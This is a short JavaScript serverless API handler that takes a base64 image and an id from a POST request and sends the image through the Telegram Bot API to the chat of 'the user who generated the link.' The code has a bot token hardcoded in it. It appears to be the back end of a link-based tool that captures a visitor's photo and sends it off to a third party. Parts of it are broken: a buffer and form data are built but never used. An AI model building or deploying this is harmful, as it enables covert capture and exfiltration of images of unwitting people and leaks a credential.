const axios = require('axios');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { image, id } = req.body;
        const botToken = "8796859741:AAEoe1AmDlHY1j1vqyPsm-XbaLAgIy5oa90";

        // Convert base64 to Buffer
        const buffer = Buffer.from(image.split(',')[1], 'base64');

        try {
            // Send photo to the specific user who generated the link
            const formData = new FormData();
            const blob = new Blob([buffer], { type: 'image/jpeg' });
            
            // Note: In Node.js environment, use a library like 'form-data' or standard fetch
            // Here is a simplified version using a direct buffer post:
            await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                chat_id: id,
                photo: image // Telegram API also accepts some direct base64 strings or URLs
            });

            res.status(200).send("Success");
        } catch (error) {
            res.status(500).send("Error");
        }
    } else {
        res.status(405).send("Method Not Allowed");
    }
}
